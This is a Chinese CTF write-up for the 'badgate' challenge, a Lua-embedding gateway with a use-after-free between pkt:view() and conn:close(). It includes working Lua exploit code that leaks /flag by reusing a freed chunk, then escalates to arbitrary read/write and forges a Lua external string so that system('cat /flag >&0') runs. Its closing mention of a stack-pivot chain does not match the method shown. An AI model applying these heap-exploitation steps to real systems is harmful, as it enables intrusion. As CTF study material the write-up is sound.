# badgate

## 题目简述

题目通过 xinetd/chroot 运行 Lua embedding 程序。核心漏洞是 `pkt:view()` 生成的 Lua 视图没有保护底层请求缓冲区生命周期，而 `conn:close()` 会释放该缓冲区，导致 Lua 侧持有稳定 UAF。这个 UAF 可以直接复用为 `/flag` 文件内容泄漏，也可以进一步扩展成任意读写并伪造 Lua external string 执行命令。

## 解题过程

服务入口为：

```text
xinetd -> chroot /home/ctf ./badgate
```

程序先从标准输入读取一段 Lua 脚本，直到单独一行 `EOF`，脚本加载后随机监听 `10000..12000` 之间的端口。每个业务连接进入后，程序会创建 `conn` 和 `pkt` 两个 Lua userdata。`pkt` 只是一段请求数据的视图，关键字段为：

```text
data_ptr
off
len
```

漏洞在 `pkt:view()` 和 `conn:close()` 的生命周期不一致：

```text
pkt:view(off, len)
  -> 创建新的 pkt userdata
  -> 指向原 data_ptr + off
  -> 不增加底层缓冲区引用计数

conn:close()
  -> 关闭 socket
  -> 释放当前请求的 0x1000 数据缓冲区
```

只要把 `pkt:view()` 的结果保存到全局变量，Lua state 会跨请求保留这个悬挂视图，而 C 层已经释放了底层 4KB chunk。

最短利用路径是让 `loadfile('/flag')` 复用这块 chunk。虽然沙箱里没有 `io` 和 `os`，但 `loadfile` 仍会打开并读取文件；文件内容能否被编译成 Lua 不重要，关键是 libc 会把 `/flag` 内容读进 stdio 缓冲区。由于刚释放的请求缓冲区大小固定，glibc 很容易把同一块 4KB chunk 分配给 stdio 缓冲。

Lua handler 可以写成：

```lua
local saved
local leak = ''
local stage = 0

local function on_request(conn, pkt)
    stage = stage + 1
    if stage == 1 then
        local n = 256
        if pkt:len() < n then
            n = pkt:len()
        end
        saved = pkt:view(0, n)
        conn:send('stage1\n')
        conn:close()
        return
    end

    if stage == 2 then
        conn:close()
        local _f, _err = loadfile('/flag')
        local ok, res = pcall(function()
            return saved:tostring()
        end)
        leak = ok and res or tostring(res)
        return
    end

    conn:send(leak)
    conn:close()
end

gateway.run(on_request)
```

完整交互为：

```text
1. 向初始端口提交 Lua 脚本，解析返回的随机监听端口。
2. 第一次连随机端口，发送任意数据，handler 保存 saved = pkt:view(0, n)，随后 close 释放缓冲区。
3. 第二次连接中先 close 当前缓冲，再执行 loadfile('/flag')，让 /flag 内容复用已释放 chunk。
4. 第三次连接直接 conn:send(leak)，返回悬挂视图读到的内容。
```

同一个 UAF 也可以扩展为更强的对象利用。先利用 `tostring(print)` 泄露 PIE：

```lua
func_str = tostring(print)
address_str = string.match(func_str, "function: 0x([0-9a-fA-F]+)")
pie = tonumber(address_str, 16) - 0xc310
```

接着在第一次请求里把 freed chunk 的复用关系铺好：

```lua
for i = 1, 20 do
    tmp[i] = string.rep("A", 128)
end
saved = pkt:view(0, pkt:len())
conn:close()
victim = saved:view(0, 1)
fake_externalstring = pkt:tostring()
```

前面的短字符串 spray 用来避免释放的 data chunk 和 top chunk 合并；`victim` 是后面要改写成任意地址视图的 `pkt`，`fake_externalstring` 则负责占住同一块区域上的 `TString`。之后修改重叠对象字段，把 `victim:view(addr - 8, 8):tostring()` 变成任意地址读，读 `send@GOT` 泄露 libc：

```lua
saved:write(0x20, string.pack("<I8", 8))
saved:write(0x30, string.pack("<I8", 0x1000000000000))
libc = string.unpack("<I8", victim:view(pie + 0x3ede8 - 8, 8):tostring()) - 0x12be90
```

随后把命令写入 `.bss`：

```lua
victim:write(pie + 0x3f100 - 8, "cat /flag >&0")
```

最后伪造 Lua 5.5 external string：

```c
typedef struct TString {
    CommonHeader;
    lu_byte extra;
    ls_byte shrlen;
    unsigned int hash;
    union {
        size_t lnglen;
        struct TString *hnext;
    } u;
    char *contents;
    lua_Alloc falloc;
    void *ud;
} TString;
```

关键字段：

```lua
saved:write(0x40 + 0x0b, string.char(0xfd))                 -- shrlen = -3 / LSTRMEM
saved:write(0x40 + 0x20, string.pack("<I8", libc + 0x58740)) -- falloc = system
saved:write(0x40 + 0x28, string.pack("<I8", pie + 0x3f100))  -- ud = command
```

当 external string 被 GC 回收时会调用：

```c
(*ts->falloc)(ts->ud, ts->contents, ts->u.lnglen + 1, 0);
```

等价于：

```c
system("cat /flag >&0");
```

最终得到：

```text
ACTF{1u4_3m83dd1n6_3v3rywh3r3|hj5io23j6}
```

脚本完成远程交互后输出 flag，验证了 gadget/栈迁移链条可用。

## 方法总结

- 核心技巧：利用 Lua userdata 视图和 C 层请求缓冲区生命周期不一致造成的 UAF，先泄露内容，必要时再扩展成任意读写和 external string 劫持。
- 识别信号：原生程序嵌入脚本 VM，且脚本对象引用 C 层缓冲区时，应检查 close/free 后 Lua 对象是否仍能访问原指针。
- 复用要点：稳定利用依赖跨请求全局 Lua state 和固定大小 chunk 复用；直接文件泄漏与 external string RCE 都来自同一个悬挂视图原语。
